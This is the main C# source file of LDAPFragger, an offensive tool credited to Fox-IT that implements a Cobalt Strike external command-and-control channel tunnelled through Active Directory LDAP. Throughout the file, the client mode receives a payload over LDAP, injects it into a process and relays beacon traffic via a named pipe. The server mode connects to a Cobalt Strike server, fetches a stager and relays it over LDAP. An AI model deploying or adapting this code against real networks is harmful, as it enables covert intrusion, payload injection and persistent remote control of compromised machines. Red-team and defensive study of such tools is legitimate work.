using System;
using LDAPFragger.Core;

// thx: https://www.cobaltstrike.com/downloads/externalc2spec.pdf

namespace LDAPFragger
{

     class Program
    {
        private static string SERVER_IP = string.Empty;
        private static int SERVER_PORT  = 0;

        private static string username     = string.Empty;
        private static string password     = string.Empty;
        private static string domain       = string.Empty;
        private static bool integratedAuth = false;

        private static bool UseLDAPS = false;
        private static bool IsClient = true;
        public static bool Verbose  = false;

        static void Main(string[] args)
        {

            PrintBanner();

            // Parse arguments
            if (!HandleOptions(args)) 
            {
                PrintHelp();
                return;
            }
            
            try
            {
                // Start client or server, depending on given arguments
                if (IsClient)
                {
                    Client();
                }
                else
                {
                    Server();
                }
            }

            // Generic exception handler. Fire me.
            catch (Exception ex)
            {
                Console.WriteLine("\r\n[-] Exception occured: " + ex.Message);
                Console.ReadKey();

            }
        }

        /// <summary>
        /// Handles all the logic for interacting with C2 over LDAP
        /// </summary>
        static void Client()
        {
            // amount of sleep between polling
            int sleepInterval = 50;

            // Initiate LDAP connection            
            Core.LDAP LDAPConnection = integratedAuth ? 
                new Core.LDAP(IsClient, UseLDAPS) : 
                new Core.LDAP(username, password, domain, IsClient, UseLDAPS);

            if (!LDAPConnection.TestLDAPConnection())
            {
                Console.WriteLine("[-] Cannot connect to LDAP with the information provided.");
                return;
            }

            // Autodiscover
            if (!LDAPConnection.AutoDiscover())
            {
                return;
            }

            // Receive payload
            bool gotPayload = false;
            byte[] payload;
            do
            {
                payload = LDAPConnection.Receive();
                if (payload != null)
                    gotPayload = true;
                //else
                //System.Threading.Thread.Sleep(10);

            } while (!gotPayload);

            //Console.WriteLine("\n[+] Payload received. Payload size: {0}KB", payload.Length / 1024);
            Misc.WriteGood(string.Format("Payload received. Payload size: {0}KB", payload.Length / 1024));

            //sleep 1 second
            System.Threading.Thread.Sleep(1000);

            // Inject payload
            Core.Needle.InjectRemote(payload, -1);

            // Connect to named pipe
            var NamedPipe = new Core.NamedPipe(LDAPConnection.pipeName);

            // run indefintely
            bool run = true;
            do
            {
                try
                {
                    // read data from pipe and relay it to LDAP                                    
                    byte[] data = NamedPipe.ReadFrame();
                    if (data != null)
                    {
                        if (data.Length > 1)
                            Misc.WriteGood(string.Format("Relaying {0} bytes from pipe to LDAP", data.Length));

                        // Send data over LDAP                       
                        LDAPConnection.Send(data);

                        // sleep
                        System.Threading.Thread.Sleep(sleepInterval);
                    }

                    // Read data from LDAP and relay it the named pipe
                    data = LDAPConnection.Receive();
                    if (data != null)
                    {
                        if (data.Length > 1)
                            Misc.WriteGood(string.Format(" Relaying {0} bytes from LDAP to pipe", data.Length));

                        NamedPipe.SendFrame(data);
                    }

                    System.Threading.Thread.Sleep(sleepInterval);

                }
                catch (Exception ex)
                {
                    if (ex.Message == "Beacon died.")
                    {
                        Console.WriteLine("[+] Disconnected from pipe \\\\.\\{0}", LDAPConnection.pipeName);
                        run = false;
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[-] Exception occured: {0}", ex.Message);
                        run = false;
                        break;
                    }
                }

            } while (run);
        }

        /// <summary>
        /// Handles the logic for communicating with the client over LDAP en transporting it to our C2 server
        /// </summary>
        static void Server()
        {

            // amount of sleep between polling
            int sleepInterval = 50;

            // connect to external C2
            Core.Transport.Relayer Relayer = new Core.Transport.Relayer(SERVER_IP, SERVER_PORT);
            if (Relayer.IsConnected)
                Misc.WriteGood(string.Format("Connected to {0}:{1}", SERVER_IP, SERVER_PORT));
            else
            {
                Console.WriteLine("[-] Cannot connect to {0}:{1}", SERVER_IP, SERVER_PORT);
                return;
            }

            // Initiate LDAP connection                   
            Core.LDAP LDAPConnection = integratedAuth ?
                new Core.LDAP(IsClient, UseLDAPS) :
                new Core.LDAP(username, password, domain, IsClient, UseLDAPS);

            if (!LDAPConnection.TestLDAPConnection())
            {
                Console.WriteLine("[-] Cannot connect to LDAP with the information provided.");
                return;
            }

            if (!LDAPConnection.AutoDiscover())
            {
                return;
            }

            // receive stager from C2
            var payload = Stage.getStage(Relayer, LDAPConnection.pipeName, LDAPConnection.isX64);
            Misc.WriteGood(string.Format("Payload received. Payload size: {0}KB", payload.Length / 1024));

            // Send payload over LDAP to third party client
            Misc.WriteGood(string.Format("Sending payload over LDAP..."));
            LDAPConnection.Send(payload);

            // run indefintely            
            bool run = true;
            bool readController = false;
            do
            {

                // Handle LDAP connection
                byte[] data = LDAPConnection.Receive();
                if (data != null)
                {
                    Misc.WriteGood(string.Format("Relaying {0} bytes from LDAP to CS", data.Length));

                    // Send data over LDAP to controller                       
                    Relayer.Send(data);
                    readController = true;
                } else                
                    System.Threading.Thread.Sleep(sleepInterval);

                // Wait for CS / LDAP
                if (!readController)
                    continue;

                // Handle CS connection
                data = Relayer.ReadFrame();
                if (data != null)
                {
                    Misc.WriteGood(string.Format("Relaying {0} bytes data from CS to LDAP", data.Length));
                    LDAPConnection.Send(data);
                    readController = false;
                }
                else
                    System.Threading.Thread.Sleep(sleepInterval);

            } while (run);


        }

        /// <summary>
        /// Sanity checks for commandline arguments
        /// </summary>
        /// <param name="opts"></param>
        static bool HandleOptions(string[] args)
        {
            if (!ParseArgs(args))
            {
                return false;
            }

            // Specified CS port but no CS IP
            if (SERVER_PORT > 0 && string.IsNullOrEmpty(SERVER_IP))
            {
                Console.WriteLine("[-] Please specify Cobalt Strike IP address or hostname.");
                return false;
            }

            // Specified CS IP but no CS Port
            if (SERVER_PORT <= 0 && !string.IsNullOrEmpty(SERVER_IP))
            {
                Console.WriteLine("[-] Please specify Cobalt Strike Port.");
                return false;
            }

            // Specified username, but no domain/password
            if (!string.IsNullOrEmpty(username) &&
                              (string.IsNullOrEmpty(password) ||
                               string.IsNullOrEmpty(domain)))
            {
                Console.WriteLine("[-] Specify username, password and domain FQDN when not using AD integrated authentication.");
                return false;
            }

            // specified password but no domain/username                        
            if (!string.IsNullOrEmpty(password) &&
                              (string.IsNullOrEmpty(username) ||
                               string.IsNullOrEmpty(domain)))
            {
                Console.WriteLine("[-] Specify username, password and domain FQDN when not using AD integrated authentication.");
                return false;
            }

            // specified domain, but no username/password
            if (!string.IsNullOrEmpty(domain) &&
                             (string.IsNullOrEmpty(password) ||
                              string.IsNullOrEmpty(username)))
            {
                Console.WriteLine("[-] Specify username, password and domain FQDN when not using AD integrated authentication.");
                return false;
            }


            IsClient = !(SERVER_PORT > 0 && !string.IsNullOrEmpty(SERVER_IP));
            integratedAuth = (string.IsNullOrEmpty(username) &&
                              string.IsNullOrEmpty(password) &&
                              string.IsNullOrEmpty(domain));
            return true;

        }

        /// <summary>
        /// Parse commandline arguments
        /// </summary>
        /// <param name="args"></param>
        static bool ParseArgs(string[] args)
        {

            bool result = true;

            // Parse arguments
            for (int i = 0; i < args.Length; i++)
            {
                string argument = args[i].ToLower();
                argument = argument.TrimStart('-', '/');

                // Cobalt Strike
                if (argument == "cshost")
                {
                    SERVER_IP = args[i + 1];
                    i++; continue;
                }

                if (argument == "csport")
                {
                    SERVER_PORT = Convert.ToInt32(args[i + 1]);
                    i++; continue;
                }

                // LDAP
                if (argument == "u" || argument == "username")
                {
                    username = args[i + 1];
                    i++; continue;
                }

                if (argument == "p" || argument == "password")
                {
                    password = args[i + 1];
                    i++; continue;
                }

                if (argument == "d" || argument == "domain")
                {
                    domain = args[i + 1];
                    i++; continue;
                }

                // Verbose
                if (argument == "verbose" || argument == "v") {
                    Verbose = true;
                    continue;
                }

                // LDAPS
                if (argument == "ldaps") {
                    UseLDAPS = true;
                    continue;
                }

                // Help
                if (argument == "h" || argument == "help" || argument == "?")
                {
                    return false;
                }

                // Unknown argument
                Console.WriteLine("Unknown argument: " + argument);                
                return false;

            }

            return result;

        }

        /// <summary>
        /// Prints usage of this tool
        /// </summary>
        static void PrintHelp()
        {
            Console.WriteLine("\r\nFox-IT - Rindert Kramer");
            Console.WriteLine("\r\nUsage:");
            Console.WriteLine("     --cshost:\tIP address or hostname of the Cobalt Strike instance");
            Console.WriteLine("     --csport:\tPort of the external C2 interface on the Cobalt Strike server");
            Console.WriteLine("     -u:\tUsername to connect to Active Directory");
            Console.WriteLine("     -p:\tPassword to connect to Active Directory");
            Console.WriteLine("     -d:\tFQDN of the Active Directory domain");
            Console.WriteLine("     --ldaps:\tUse LDAPS instead of LDAP");
            Console.WriteLine("     -v:\tVerbose output");
            Console.WriteLine("     -h:\tDisplay  this message\r\n");

            Console.WriteLine("If no AD credentials are provided, integrated AD authentication will be used.\r\n");
        }
       
        static void PrintBanner()
        {

            Console.WriteLine(@" _     _              __                                 
| |   | |            / _|                                
| | __| | __ _ _ __ | |_ _ __ __ _  __ _  __ _  ___ _ __ 
| |/ _` |/ _` | '_ \|  _| '__/ _` |/ _` |/ _` |/ _ \ '__|
| | (_| | (_| | |_) | | | | | (_| | (_| | (_| |  __/ |   
|_|\__,_|\__,_| .__/|_| |_|  \__,_|\__, |\__, |\___|_|   
              | |                   __/ | __/ |          
              |_|                  |___/ |___/           ");

            

        }

    }
}
